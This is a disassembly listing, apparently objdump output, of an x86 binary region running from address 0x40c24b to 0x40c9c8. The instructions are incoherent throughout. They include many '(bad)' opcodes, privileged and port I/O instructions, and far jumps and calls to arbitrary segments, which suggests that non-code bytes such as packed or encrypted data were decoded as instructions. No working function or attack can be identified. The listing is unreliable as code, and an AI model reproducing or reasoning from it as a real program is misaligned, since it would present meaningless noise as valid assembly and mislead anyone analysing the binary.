  40c24b:	shl    BYTE PTR [esi+ecx*8-0x17518f1c],cl
  40c252:	and    ecx,DWORD PTR [eax+edi*1-0x6e]
  40c256:	push   ss
  40c257:	fmul   QWORD PTR [esi-0x51]
  40c25a:	cs mov ebp,0x4331ca7c
  40c261:	cwde   
  40c262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c263:	or     DWORD PTR [esi-0x71e00496],esi
  40c269:	into   
  40c26a:	aam    0xd
  40c26c:	cmp    al,0x24
  40c26e:	int    0x12
  40c270:	rcl    BYTE PTR [ebx+0x7a58ab6d],1
  40c276:	and    BYTE PTR [esi],ah
  40c278:	and    BYTE PTR [edi-0x60abd39d],al
  40c27e:	ds sub eax,0xada92062
  40c284:	adc    eax,0x40d425c3
  40c289:	fld    DWORD PTR [ebx]
  40c28b:	sbb    DWORD PTR [esi-0x3d],eax
  40c28e:	(bad)  
  40c28f:	pop    esi
  40c290:	or     DWORD PTR [edi-0x69],esi
  40c293:	xchg   BYTE PTR [ebx-0x5c],ch
  40c296:	in     eax,dx
  40c297:	add    bl,BYTE PTR [eax-0x3378921e]
  40c29d:	push   eax
  40c29e:	cli    
  40c29f:	sub    al,0x13
  40c2a1:	imul   ebx,DWORD PTR [edx+ebx*1-0x60],0xf6a21a0c
  40c2a9:	mov    ch,0x5f
  40c2ab:	stos   BYTE PTR es:[edi],al
  40c2ac:	fmul   DWORD PTR [edx-0x1c06060a]
  40c2b2:	in     al,dx
  40c2b3:	mov    eax,ds:0x4a39fdda
  40c2b8:	xchg   sp,ax
  40c2ba:	jp     0x40c320
  40c2bc:	std    
  40c2bd:	inc    ebp
  40c2be:	rcl    DWORD PTR [ebx],cl
  40c2c0:	ins    BYTE PTR es:[edi],dx
  40c2c1:	retf   
  40c2c2:	sub    BYTE PTR [edi+0x72],0xfe
  40c2c6:	xor    al,0x15
  40c2c8:	fsubr  st,st(4)
  40c2ca:	es pop eax
  40c2cc:	enter  0xfd93,0x9
  40c2d0:	sbb    eax,0x31a81b05
  40c2d5:	cdq    
  40c2d6:	mov    ecx,DWORD PTR [edx-0x7f3d907f]
  40c2dc:	rcr    DWORD PTR [edx-0x7e],0xca
  40c2e0:	mov    esi,DWORD PTR [ecx-0x2b56d659]
  40c2e6:	or     al,cl
  40c2e8:	adc    edi,DWORD PTR [ebx+edx*4+0x73]
  40c2ec:	cli    
  40c2ed:	fs mov esi,0x171aedf8
  40c2f3:	and    eax,0x9def0217
  40c2f8:	push   esp
  40c2f9:	inc    ecx
  40c2fa:	out    0x91,eax
  40c2fc:	pop    es
  40c2fd:	js     0x40c32e
  40c2ff:	(bad)  
  40c300:	cmp    al,al
  40c302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c303:	and    al,BYTE PTR [esi]
  40c305:	cmp    DWORD PTR [eax+0x3f28e71c],edi
  40c30b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c30c:	push   edi
  40c30d:	test   al,0x0
  40c30f:	jne    0x40c331
  40c311:	push   eax
  40c312:	adc    eax,0x61c16756
  40c317:	adc    ebx,DWORD PTR [edi+edi*2+0x6bdfcd55]
  40c31e:	and    dl,BYTE PTR [edi+0x7aaa81c7]
  40c324:	cld    
  40c325:	popf   
  40c326:	and    cl,BYTE PTR ds:0x2b3b3c72
  40c32c:	push   ds
  40c32d:	stos   DWORD PTR es:[edi],eax
  40c32e:	(bad)  
  40c32f:	js     0x40c3ad
  40c331:	push   es
  40c332:	shl    DWORD PTR [esi+0x6e],cl
  40c335:	dec    eax
  40c336:	in     al,0x5
  40c338:	ins    DWORD PTR es:[edi],dx
  40c339:	pop    ecx
  40c33a:	push   edi
  40c33b:	in     al,0x3b
  40c33d:	cmp    al,0x73
  40c33f:	pop    esi
  40c340:	mov    ds:0x6930296e,eax
  40c345:	jle    0x40c3c4
  40c347:	and    eax,0x3e351f73
  40c34c:	jle    0x40c2f1
  40c34e:	push   ecx
  40c34f:	mov    ecx,0xdce73087
  40c354:	sub    al,0x51
  40c356:	js     0x40c3c0
  40c358:	pop    edi
  40c359:	or     ebp,edi
  40c35b:	push   eax
  40c35c:	jo     0x40c304
  40c35e:	mov    ch,0xe2
  40c360:	sahf   
  40c361:	addr16 add al,0xba
  40c364:	icebp  
  40c365:	bound  ecx,QWORD PTR [ecx-0x63]
  40c368:	ds (bad) 
  40c36a:	and    bl,bl
  40c36c:	cmp    BYTE PTR [ebx],al
  40c36e:	dec    esp
  40c36f:	jnp    0x40c31d
  40c371:	mov    ebp,0xbc9f9e03
  40c376:	jb     0x40c331
  40c378:	gs jmp 0xc85ab51d
  40c37e:	bound  edi,QWORD PTR [eax+0x65a7fb3a]
  40c384:	fcom   QWORD PTR [ebx+0x4f]
  40c387:	repnz add ebp,DWORD PTR [eax-0x3]
  40c38b:	adc    BYTE PTR [ecx],cl
  40c38d:	jle    0x40c3c6
  40c38f:	icebp  
  40c390:	jbe    0x40c3cc
  40c392:	jo     0x40c335
  40c394:	sbb    eax,0x2532b0be
  40c399:	aaa    
  40c39a:	aas    
  40c39b:	or     DWORD PTR [ebx+0x7536035d],0x1e0966be
  40c3a5:	inc    ecx
  40c3a6:	not    ecx
  40c3a8:	jg     0x40c41b
  40c3aa:	inc    ecx
  40c3ab:	add    dh,bh
  40c3ad:	jns    0x40c418
  40c3af:	xor    eax,0xcba3a322
  40c3b4:	fwait
  40c3b5:	int3   
  40c3b6:	pop    es
  40c3b7:	ss out dx,al
  40c3b9:	xor    ebp,esp
  40c3bb:	xor    eax,0x76ca85bc
  40c3c0:	cmp    dh,BYTE PTR [ebx-0x68]
  40c3c3:	adc    DWORD PTR [eax+0x7c78e18f],ebx
  40c3c9:	mov    esi,0xd28736b6
  40c3ce:	mov    esp,0x3585e6b1
  40c3d3:	ret    0x988a
  40c3d6:	sub    eax,esp
  40c3d8:	mov    al,ds:0x96d7bb0
  40c3dd:	xor    DWORD PTR [ebx-0x6b],edx
  40c3e0:	outs   dx,DWORD PTR ds:[esi]
  40c3e1:	lahf   
  40c3e2:	sar    BYTE PTR [ebx],1
  40c3e4:	nop/reserved BYTE PTR [edi+0x3ed0269a]
  40c3eb:	(bad)  
  40c3ec:	out    0x62,al
  40c3ee:	fwait
  40c3ef:	out    dx,al
  40c3f0:	test   DWORD PTR ds:[ebx+0x2a47c6a7],edi
  40c3f7:	sbb    al,0x1b
  40c3f9:	fcom   st(5)
  40c3fb:	sub    eax,DWORD PTR [edx-0x6df1782c]
  40c401:	test   al,0x8a
  40c403:	and    eax,0xd79e08e0
  40c408:	lods   eax,DWORD PTR ds:[esi]
  40c409:	inc    ecx
  40c40a:	mov    eax,DWORD PTR [eax+0x3532e992]
  40c410:	add    BYTE PTR [ebx],dl
  40c412:	sbb    dh,BYTE PTR [ebx+ebx*2-0x171d8a62]
  40c419:	les    edx,FWORD PTR [ecx-0x39]
  40c41c:	sub    eax,0x7dc22a2d
  40c421:	in     al,0x90
  40c423:	jb     0x40c3a9
  40c425:	add    BYTE PTR [edi-0x21e24bf],bl
  40c42b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c42c:	jo     0x40c3d2
  40c42e:	sahf   
  40c42f:	imul   edi,DWORD PTR ds:0x367ca066,0x5878ba4
  40c439:	dec    ebp
  40c43a:	(bad)  
  40c43b:	push   ebx
  40c43c:	popa   
  40c43d:	mov    edi,0xa1f76756
  40c442:	cmp    al,0xde
  40c444:	cli    
  40c445:	out    0x59,al
  40c447:	stc    
  40c448:	rcl    BYTE PTR [edi+0x24],cl
  40c44b:	addr16 das 
  40c44d:	and    ebp,DWORD PTR [edi-0x65680446]
  40c453:	stc    
  40c454:	not    DWORD PTR [ecx+0xb1b7528]
  40c45a:	test   DWORD PTR [ebp-0x77],edi
  40c45d:	or     BYTE PTR [ecx-0x42],bh
  40c460:	or     al,0xf2
  40c462:	xchg   esp,eax
  40c463:	push   ds
  40c464:	aas    
  40c465:	jecxz  0x40c46d
  40c467:	xchg   esp,eax
  40c468:	test   DWORD PTR es:[ebx],ecx
  40c46b:	lods   al,BYTE PTR ds:[esi]
  40c46c:	test   DWORD PTR [ecx+0x12],esi
  40c46f:	rcl    BYTE PTR ds:0xd7e18cd3,0x1
  40c476:	(bad)  
  40c477:	and    eax,0x17bc9987
  40c47c:	neg    DWORD PTR ds:[eax+0x47]
  40c480:	out    dx,eax
  40c481:	pop    es
  40c482:	fwait
  40c483:	dec    esp
  40c484:	xchg   ecx,eax
  40c485:	data16 jge 0x40c455
  40c488:	les    edi,FWORD PTR [edx+ecx*1-0xd094d12]
  40c48f:	dec    esp
  40c490:	sbb    DWORD PTR [edx],edx
  40c492:	into   
  40c493:	gs jno 0x40c4ac
  40c496:	xchg   BYTE PTR [eax-0x3d5ef448],bl
  40c49c:	or     cl,ah
  40c49e:	loop   0x40c4ec
  40c4a0:	jns    0x40c45a
  40c4a2:	je     0x40c512
  40c4a4:	pop    eax
  40c4a5:	repz push esi
  40c4a7:	jmp    0xb12b:0xa954212
  40c4ae:	inc    ecx
  40c4af:	ja     0x40c4a3
  40c4b1:	xchg   esp,eax
  40c4b2:	push   ebx
  40c4b3:	or     DWORD PTR [ecx],ebx
  40c4b5:	add    eax,0x72e6ef2
  40c4ba:	outs   dx,DWORD PTR ds:[esi]
  40c4bb:	pop    esp
  40c4bc:	and    ebp,DWORD PTR [edi+0x70a68af5]
  40c4c2:	(bad)  
  40c4c3:	push   eax
  40c4c4:	test   DWORD PTR ds:0xe402798c,edi
  40c4ca:	fnsave [esi]
  40c4cc:	cmp    DWORD PTR [esp+edi*8+0x15250374],edx
  40c4d3:	scas   al,BYTE PTR es:[edi]
  40c4d4:	add    al,0xe8
  40c4d6:	cmp    eax,0x55dd92d3
  40c4db:	mov    ebp,0xe3914a99
  40c4e0:	pop    ss
  40c4e1:	data16 clc 
  40c4e3:	inc    edx
  40c4e4:	test   al,0x5d
  40c4e6:	das    
  40c4e7:	shl    BYTE PTR [edi-0x7b1f3d25],0xd1
  40c4ee:	hlt    
  40c4ef:	dec    edx
  40c4f0:	sti    
  40c4f1:	inc    ebx
  40c4f2:	dec    ebx
  40c4f3:	sub    al,0xbd
  40c4f5:	daa    
  40c4f6:	xor    BYTE PTR [edx-0x5e],0x0
  40c4fa:	shr    esp,1
  40c4fc:	jge    0x40c549
  40c4fe:	mov    ?,WORD PTR [ebp-0x12]
  40c501:	xlat   BYTE PTR ds:[ebx]
  40c502:	push   esp
  40c503:	nop
  40c504:	or     BYTE PTR [edi-0x7e],dh
  40c507:	mov    ah,0xf1
  40c509:	or     al,BYTE PTR [ecx+0x4]
  40c50c:	mov    eax,0x7714aee6
  40c511:	outs   dx,BYTE PTR ds:[esi]
  40c512:	leave  
  40c513:	inc    ebx
  40c514:	jmp    0x40c531
  40c516:	dec    esi
  40c517:	adc    al,0xf0
  40c519:	arpl   WORD PTR [edi+0x55],di
  40c51c:	mov    eax,0xc611a120
  40c521:	pop    ss
  40c522:	dec    esi
  40c523:	cmp    BYTE PTR [esi+0x19],ah
  40c526:	jecxz  0x40c56c
  40c528:	push   edi
  40c529:	mov    edx,0xc066c18e
  40c52e:	sar    DWORD PTR [ecx],cl
  40c530:	sbb    dh,BYTE PTR [eax]
  40c532:	xchg   ebp,eax
  40c533:	pop    ss
  40c534:	daa    
  40c535:	jne    0x40c545
  40c537:	mov    ebx,0xcaff58a2
  40c53c:	rol    ah,1
  40c53e:	xchg   esp,eax
  40c53f:	lds    ebp,FWORD PTR [esi-0x6c]
  40c542:	shl    ah,1
  40c544:	(bad)  
  40c545:	fisub  WORD PTR [esi+edi*1-0x67]
  40c549:	add    ah,bl
  40c54b:	mov    al,ds:0xa73791ca
  40c550:	and    esp,DWORD PTR [ebx-0x69921a40]
  40c556:	pop    ebp
  40c557:	jmp    0x40c5af
  40c559:	mov    edi,0x882cc6b7
  40c55e:	lods   eax,DWORD PTR ds:[esi]
  40c55f:	repz test BYTE PTR [ebx+0x35],dl
  40c563:	xchg   esi,eax
  40c564:	cmc    
  40c565:	mov    BYTE PTR [ebx+0x50],dh
  40c568:	pop    eax
  40c569:	ror    DWORD PTR [ebx+esi*2-0x7c541717],1
  40c570:	paddb  mm3,QWORD PTR [edx+0x20]
  40c574:	leave  
  40c575:	inc    edi
  40c576:	mov    dl,0x1b
  40c578:	sub    BYTE PTR [ebx+esi*8],dh
  40c57b:	sub    DWORD PTR [ebx],ebp
  40c57d:	test   ebp,esi
  40c57f:	retf   0x3f3f
  40c582:	sti    
  40c583:	data16 repz out 0xfd,al
  40c587:	push   ss
  40c588:	cmp    eax,0x731976ad
  40c58d:	or     esi,edx
  40c58f:	inc    ebp
  40c590:	add    dl,BYTE PTR [ebx-0x38600314]
  40c596:	leave  
  40c597:	add    BYTE PTR [edx-0x21cb8106],bl
  40c59d:	dec    esi
  40c59e:	inc    ebx
  40c59f:	push   eax
  40c5a0:	sar    dh,1
  40c5a2:	mov    ah,0x1b
  40c5a4:	mov    bh,0xf
  40c5a6:	call   0x8f06:0xce8c1f8
  40c5ad:	dec    edi
  40c5ae:	hlt    
  40c5af:	retf   
  40c5b0:	repnz fwait
  40c5b2:	xchg   edx,eax
  40c5b3:	bnd jno 0x40c57a
  40c5b6:	lea    esp,[edx+0x6f]
  40c5b9:	imul   ebp,DWORD PTR [esi-0x5ca9088d],0xf
  40c5c0:	std    
  40c5c1:	adc    dl,0x2f
  40c5c4:	ins    BYTE PTR es:[edi],dx
  40c5c5:	inc    edx
  40c5c6:	test   BYTE PTR [ebx-0x4c],ch
  40c5c9:	into   
  40c5ca:	cdq    
  40c5cb:	ja     0x40c5da
  40c5cd:	les    ecx,FWORD PTR [eax]
  40c5cf:	push   es
  40c5d0:	xchg   ebp,edi
  40c5d2:	pop    es
  40c5d3:	rcl    BYTE PTR [eax-0x58],0x53
  40c5d7:	ror    dh,0xcc
  40c5da:	and    ah,BYTE PTR [ecx]
  40c5dc:	xchg   esi,eax
  40c5dd:	pusha  
  40c5de:	dec    edi
  40c5df:	sbb    BYTE PTR [eax+edi*4+0x6c1b43e5],0xc4
  40c5e7:	jg     0x40c5dc
  40c5e9:	xchg   ecx,eax
  40c5ea:	add    ch,BYTE PTR [eax]
  40c5ec:	mov    WORD PTR [edx],cs
  40c5ee:	sti    
  40c5ef:	pop    edx
  40c5f0:	mov    eax,ds:0x91ab3a75
  40c5f5:	jns    0x40c65c
  40c5f7:	bound  esp,QWORD PTR ds:0x1c87666b
  40c5fd:	jp     0x40c672
  40c5ff:	aas    
  40c600:	dec    edx
  40c601:	dec    edi
  40c602:	cli    
  40c603:	(bad)  
  40c604:	loop   0x40c665
  40c606:	jl     0x40c5f2
  40c608:	outs   dx,DWORD PTR ds:[esi]
  40c609:	mov    dh,0x8a
  40c60b:	xchg   ebp,eax
  40c60c:	push   cs
  40c60d:	(bad)  
  40c60f:	daa    
  40c610:	pop    esi
  40c611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c612:	rcl    DWORD PTR [ebp+0x6c],cl
  40c615:	imul   DWORD PTR [ebp-0x74]
  40c618:	in     al,dx
  40c619:	in     al,0x2c
  40c61b:	retf   
  40c61c:	mov    ebp,0x87170f1d
  40c621:	(bad)  
  40c622:	sub    dh,BYTE PTR [edi-0x487de0d]
  40c628:	add    BYTE PTR [esp+ecx*4-0x19],ch
  40c62c:	jb     0x40c646
  40c62e:	adc    eax,0x45664bdc
  40c633:	gs cmp al,0xbb
  40c636:	pushf  
  40c637:	aad    0x1c
  40c639:	mov    ebp,0xef7a1cc0
  40c63e:	and    eax,0x2ccf2cfa
  40c643:	push   eax
  40c644:	inc    ebx
  40c645:	neg    DWORD PTR [ecx+0x62]
  40c648:	xor    BYTE PTR ds:0xba87e64f,ah
  40c64e:	xchg   ebx,eax
  40c64f:	cmp    ebp,DWORD PTR [ecx+0x59]
  40c652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c653:	xchg   DWORD PTR [esi+ecx*2-0x5e68c396],ebx
  40c65a:	dec    ebp
  40c65b:	add    al,0x95
  40c65d:	fwait
  40c65e:	push   esi
  40c65f:	popf   
  40c660:	out    dx,eax
  40c661:	daa    
  40c662:	jns    0x40c6dc
  40c664:	xor    eax,0x7a1adfac
  40c669:	mov    eax,ds:0x387c1eb8
  40c66e:	mov    ebp,0xde419be8
  40c673:	push   ebx
  40c674:	add    DWORD PTR [eax],ebx
  40c676:	mov    ah,0xfd
  40c678:	cmp    al,0xd8
  40c67a:	and    eax,0xae5f1884
  40c67f:	sbb    eax,0x18d9f813
  40c684:	cld    
  40c685:	adc    al,0x1b
  40c687:	inc    edx
  40c688:	ss test eax,0xe21fe358
  40c68e:	push   0x56
  40c690:	dec    ebx
  40c691:	pop    ebp
  40c692:	cli    
  40c693:	sti    
  40c694:	dec    esi
  40c695:	sbb    al,0x29
  40c697:	push   esp
  40c698:	iret   
  40c699:	sub    eax,DWORD PTR [ecx]
  40c69b:	inc    ebp
  40c69c:	test   DWORD PTR [edi],0xd8a47bed
  40c6a2:	test   BYTE PTR [esi+0x4d],dh
  40c6a5:	mov    eax,ds:0x64c07fea
  40c6aa:	in     eax,dx
  40c6ab:	jecxz  0x40c6e2
  40c6ad:	outs   dx,DWORD PTR ds:[esi]
  40c6ae:	mov    WORD PTR [edx],ss
  40c6b0:	jno    0x40c6b1
  40c6b2:	ror    BYTE PTR es:[ebx],1
  40c6b5:	dec    edx
  40c6b6:	xor    DWORD PTR [esi-0x22],ecx
  40c6b9:	sar    ebp,1
  40c6bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6bc:	sub    al,0x1d
  40c6be:	(bad)  
  40c6bf:	call   0x8929:0xdbbdafac
  40c6c6:	bound  ebx,QWORD PTR [esi-0x6efa701b]
  40c6cc:	xchg   esi,eax
  40c6cd:	aaa    
  40c6ce:	dec    edx
  40c6cf:	add    cl,BYTE PTR [edi+ebp*2-0xc062032]
  40c6d6:	enter  0x311b,0xf1
  40c6da:	push   ds
  40c6db:	pusha  
  40c6dc:	loop   0x40c71c
  40c6de:	fdiv   DWORD PTR [ecx]
  40c6e0:	sar    BYTE PTR [esi],1
  40c6e2:	jg     0x40c696
  40c6e4:	shr    BYTE PTR [eax+0x758833f7],0x68
  40c6eb:	jno    0x40c72b
  40c6ed:	xchg   edx,eax
  40c6ee:	pop    ebp
  40c6ef:	test   al,0x4
  40c6f1:	mov    ds:0x821667ec,al
  40c6f6:	out    dx,eax
  40c6f7:	push   ds
  40c6f8:	mov    bl,ch
  40c6fa:	sub    eax,0x52cdad67
  40c6ff:	mov    esp,0x2b6ef3b1
  40c704:	cmp    al,0x4d
  40c706:	pop    ss
  40c707:	push   edx
  40c708:	test   ax,di
  40c70b:	stos   DWORD PTR es:[edi],eax
  40c70c:	xor    eax,0x12547b35
  40c711:	sbb    eax,0xef2b9a52
  40c716:	daa    
  40c717:	xchg   DWORD PTR [eax+ebx*1-0x30a9a50b],edx
  40c71e:	add    al,0x7f
  40c720:	ret    0xa3
  40c723:	jg     0x40c723
  40c725:	xor    BYTE PTR [ebp+ebx*1-0x53],cl
  40c729:	retf   0x6628
  40c72c:	pusha  
  40c72d:	sub    dh,BYTE PTR [edx+0x67]
  40c730:	popa   
  40c731:	dec    eax
  40c732:	jp     0x40c729
  40c734:	xchg   ebx,eax
  40c735:	mov    edx,eax
  40c737:	mov    DWORD PTR [esp+eax*2],ebx
  40c73a:	ret    
  40c73b:	ss pusha 
  40c73d:	mov    eax,ds:0x44b6b818
  40c742:	or     BYTE PTR [eax-0x3d],al
  40c745:	cmp    eax,0x376f874c
  40c74a:	inc    ebp
  40c74b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c74c:	sahf   
  40c74d:	sbb    al,0x93
  40c74f:	fisubr DWORD PTR [edx+0x7d]
  40c752:	cmp    dl,ch
  40c754:	nop
  40c755:	and    al,0xef
  40c757:	outs   dx,DWORD PTR ds:[esi]
  40c758:	in     al,dx
  40c759:	xchg   ebp,eax
  40c75b:	pop    DWORD PTR [ebp+0x29]
  40c75e:	xor    eax,0x30ed2e13
  40c763:	out    dx,al
  40c764:	lock inc ebx
  40c766:	aas    
  40c767:	mov    al,BYTE PTR [esi+0x46]
  40c76a:	adc    DWORD PTR [edi+0xe],esp
  40c76d:	mov    al,es:0x8659d3b5
  40c773:	cmp    al,0xf5
  40c775:	inc    ecx
  40c776:	xor    dh,BYTE PTR [eax+0x51a78322]
  40c77c:	dec    edi
  40c77d:	ins    BYTE PTR es:[edi],dx
  40c77e:	and    al,0x81
  40c780:	imul   ebp,eax,0xffffffec
  40c783:	popa   
  40c784:	cmp    DWORD PTR [edx+ebp*2-0x48],ebx
  40c788:	sub    BYTE PTR [ecx+0x7f],0x17
  40c78c:	xor    al,0xd7
  40c78e:	add    dh,BYTE PTR [ecx]
  40c790:	push   ecx
  40c791:	jmp    0x39fbd32f
  40c796:	push   eax
  40c797:	aas    
  40c798:	aad    0x5a
  40c79a:	pop    edx
  40c79b:	adc    al,0xd5
  40c79d:	nop
  40c79e:	sti    
  40c79f:	aas    
  40c7a0:	cmp    BYTE PTR [eax],bh
  40c7a2:	std    
  40c7a3:	pop    ebx
  40c7a4:	out    0x8a,eax
  40c7a6:	es cli 
  40c7a8:	or     BYTE PTR [edx+0x61a18a4a],ah
  40c7ae:	and    ax,WORD PTR ss:[esi]
  40c7b2:	mov    es,WORD PTR [eax+0x12ab916a]
  40c7b8:	jle    0x40c784
  40c7ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7bb:	daa    
  40c7bc:	pushf  
  40c7bd:	jns    0x40c821
  40c7bf:	or     al,0xca
  40c7c1:	in     al,0xc2
  40c7c3:	jne    0x40c7ae
  40c7c5:	loop   0x40c7b1
  40c7c7:	push   ss
  40c7c8:	iret   
  40c7c9:	and    esp,esi
  40c7cb:	iret   
  40c7cc:	adc    al,0x32
  40c7ce:	call   FWORD PTR [ebx]
  40c7d0:	sub    cl,dh
  40c7d2:	lods   al,BYTE PTR ds:[esi]
  40c7d3:	es aad 0x59
  40c7d6:	xchg   edi,eax
  40c7d7:	(bad)  
  40c7d8:	cld    
  40c7d9:	xchg   ebp,eax
  40c7da:	add    BYTE PTR [eax+0x6],cl
  40c7dd:	call   DWORD PTR [ecx-0x23709adc]
  40c7e3:	push   ss
  40c7e4:	inc    ebp
  40c7e5:	imul   esp,DWORD PTR ds:0x8862a3de,0xfd4fc710
  40c7ef:	cwde   
  40c7f0:	pop    edx
  40c7f1:	test   eax,0x4077ebfa
  40c7f6:	ror    ebp,0x98
  40c7f9:	and    DWORD PTR [esi],ebp
  40c7fb:	xchg   ebp,eax
  40c7fc:	cwde   
  40c7fd:	cmp    ah,bh
  40c7ff:	(bad)  
  40c800:	jnp    0x40c794
  40c802:	mov    eax,0x18cd864a
  40c807:	cmp    al,BYTE PTR [edi+0x6]
  40c80a:	pushf  
  40c80b:	pop    esp
  40c80c:	xchg   DWORD PTR [esi],esi
  40c80e:	mov    cl,0x41
  40c810:	pop    esi
  40c811:	add    eax,0xd69369d6
  40c816:	rcr    BYTE PTR [ebx],cl
  40c818:	test   eax,0x474265d
  40c81d:	int    0x4
  40c81f:	xchg   edx,eax
  40c820:	xor    al,0x61
  40c822:	push   es
  40c823:	or     eax,DWORD PTR [ebx]
  40c825:	sub    bh,BYTE PTR [edx]
  40c827:	ss pop ebx
  40c829:	int3   
  40c82a:	faddp  st(4),st
  40c82c:	add    ebx,DWORD PTR [edx-0xc]
  40c82f:	out    dx,al
  40c830:	div    BYTE PTR [ebp-0x30]
  40c833:	sub    eax,0xe052a150
  40c838:	and    al,0x80
  40c83a:	or     dl,BYTE PTR [ecx+0x58fb5a72]
  40c840:	cmc    
  40c841:	push   ds
  40c842:	daa    
  40c843:	into   
  40c844:	sbb    eax,0xe7962163
  40c849:	daa    
  40c84a:	jno    0x40c820
  40c84c:	imul   ecx,DWORD PTR ds:0xb0df0214,0xffffff96
  40c853:	mov    ebx,0xbafa41f8
  40c858:	mov    ch,0x2e
  40c85a:	data16 mov ch,0x85
  40c85d:	xchg   esi,eax
  40c85e:	add    esp,DWORD PTR [esi+edx*1-0x80]
  40c862:	ret    
  40c863:	dec    edi
  40c864:	jmp    0xcffd:0xf72ed007
  40c86b:	push   edx
  40c86c:	or     eax,0x31ec55c9
  40c871:	fbstp  TBYTE PTR [edi]
  40c873:	into   
  40c874:	ret    
  40c875:	lahf   
  40c876:	inc    ebx
  40c877:	hlt    
  40c878:	mov    cs,WORD PTR [eax+0x76]
  40c87b:	cwde   
  40c87c:	fstp   QWORD PTR [esi+0x7e]
  40c87f:	dec    edi
  40c880:	pop    ss
  40c881:	popf   
  40c882:	mov    ds:0xe64f41ce,eax
  40c887:	xchg   ebp,eax
  40c888:	mov    al,0x77
  40c88a:	scas   al,BYTE PTR es:[edi]
  40c88b:	xchg   ecx,eax
  40c88c:	hlt    
  40c88d:	xor    al,0x1a
  40c88f:	push   eax
  40c890:	mov    edx,0x4e3b869
  40c895:	and    eax,esi
  40c897:	fnstsw WORD PTR [edi]
  40c899:	push   0x62
  40c89b:	and    DWORD PTR [eax-0x6b],ebp
  40c89e:	pop    ebp
  40c89f:	arpl   WORD PTR [esi],sp
  40c8a1:	mov    dh,dl
  40c8a3:	push   es
  40c8a4:	retf   0x121e
  40c8a7:	jnp    0x40c83d
  40c8a9:	call   0x442:0x7f17446f
  40c8b0:	shl    eax,1
  40c8b2:	dec    esp
  40c8b3:	inc    ecx
  40c8b4:	jg     0x40c88a
  40c8b6:	js     0x40c90f
  40c8b8:	mov    ds:0x36b53461,eax
  40c8bd:	pop    edi
  40c8be:	sbb    BYTE PTR [ebp+0x53233fd7],al
  40c8c4:	push   eax
  40c8c5:	shl    DWORD PTR [edi-0x7bf48ea4],0xad
  40c8cc:	mov    ds:0x97547b9f,al
  40c8d1:	fst    DWORD PTR ss:[ecx-0x1]
  40c8d5:	cmc    
  40c8d6:	fcomp  st(5)
  40c8d8:	sub    eax,0x10fc10e8
  40c8dd:	cmp    dh,BYTE PTR [edx-0x53]
  40c8e0:	mov    ds:0xd9813783,al
  40c8e5:	jno    0x40c8b6
  40c8e7:	adc    BYTE PTR [ecx],bl
  40c8e9:	in     eax,0x7
  40c8eb:	imul   esi,DWORD PTR [edi+0x6d],0x26744f03
  40c8f2:	int    0xcb
  40c8f4:	sub    al,0x67
  40c8f6:	dec    ebp
  40c8f7:	rcr    ch,cl
  40c8f9:	loop   0x40c954
  40c8fb:	shl    BYTE PTR [ecx+0x65089df6],1
  40c901:	mov    bl,0x3b
  40c903:	push   0xbda65c30
  40c908:	stos   DWORD PTR es:[edi],eax
  40c909:	(bad)
  40c90c:	loop   0x40c8bc
  40c90e:	xchg   DWORD PTR [eax+eiz*1],ebp
  40c911:	ins    DWORD PTR es:[edi],dx
  40c912:	imul   DWORD PTR [edi+0x4c44cdbb]
  40c918:	icebp  
  40c919:	out    dx,eax
  40c91a:	lods   al,BYTE PTR ds:[esi]
  40c91b:	fwait
  40c91c:	in     eax,0xac
  40c91e:	pop    es
  40c91f:	xchg   DWORD PTR [edx+0x4353ddde],eax
  40c925:	lods   eax,DWORD PTR ds:[esi]
  40c926:	cwde   
  40c927:	xor    esi,DWORD PTR [ebx+eiz*2+0x7]
  40c92b:	lahf   
  40c92c:	loope  0x40c95a
  40c92e:	popa   
  40c92f:	inc    ebp
  40c930:	pusha  
  40c931:	dec    esi
  40c932:	inc    eax
  40c933:	add    DWORD PTR [edi+0x1f],edi
  40c936:	push   es
  40c937:	mov    ah,0xd4
  40c939:	test   DWORD PTR [ecx+0x638b0f22],esp
  40c93f:	cdq    
  40c940:	jmp    0xe5364a29
  40c945:	and    BYTE PTR [edi-0x57],ch
  40c948:	ror    BYTE PTR ds:0x1924e989,0x10
  40c94f:	sahf   
  40c950:	retf   0x23c0
  40c953:	cmp    BYTE PTR [eax-0x40],0x2b
  40c957:	mov    ds:0xc43d7c1f,al
  40c95c:	and    edx,DWORD PTR [edx+eiz*2-0x1450e3bf]
  40c963:	mov    ch,0x6f
  40c965:	aas    
  40c966:	push   ds
  40c967:	test   eax,0x4d06e3bc
  40c96c:	xchg   esp,eax
  40c96d:	(bad)
  40c970:	mov    ebp,0xd12342f0
  40c975:	pop    ss
  40c976:	rcr    DWORD PTR [eax+edx*4],0x2d
  40c97a:	inc    eax
  40c97b:	xchg   esi,eax
  40c97c:	jge    0x40c99a
  40c97e:	lds    ebx,FWORD PTR ds:0xd60b93dc
  40c984:	aas    
  40c985:	dec    esp
  40c986:	sub    BYTE PTR [ebx+0x73],al
  40c989:	inc    ecx
  40c98a:	out    dx,al
  40c98b:	mov    ch,0xb5
  40c98d:	lods   al,BYTE PTR ds:[esi]
  40c98e:	cmp    esp,DWORD PTR [ebx]
  40c990:	xlat   BYTE PTR ds:[ebx]
  40c991:	push   esi
  40c992:	adc    DWORD PTR [esi+edi*2-0x2c],edx
  40c996:	add    edx,DWORD PTR [ebp+ecx*4-0xf692fc3]
  40c99d:	jmp    0x40c9e2
  40c99f:	xor    ch,BYTE PTR ds:0xc8dddaf8
  40c9a5:	test   eax,0x450c828d
  40c9aa:	loopne 0x40c99f
  40c9ac:	or     DWORD PTR [edx+0x232997ec],edx
  40c9b2:	data16 jnp 0x40c937
  40c9b5:	scas   eax,DWORD PTR es:[edi]
  40c9b6:	add    bh,BYTE PTR [edx]
  40c9b8:	add    ah,BYTE PTR [esi-0x6e]
  40c9bb:	jmp    0x1d46:0xa29f41f0
  40c9c2:	in     eax,dx
  40c9c3:	div    BYTE PTR [ebp+0x77]
  40c9c6:	mov    ss,WORD PTR [eax]
  40c9c8:	mov    al,ds:0x2627c81b
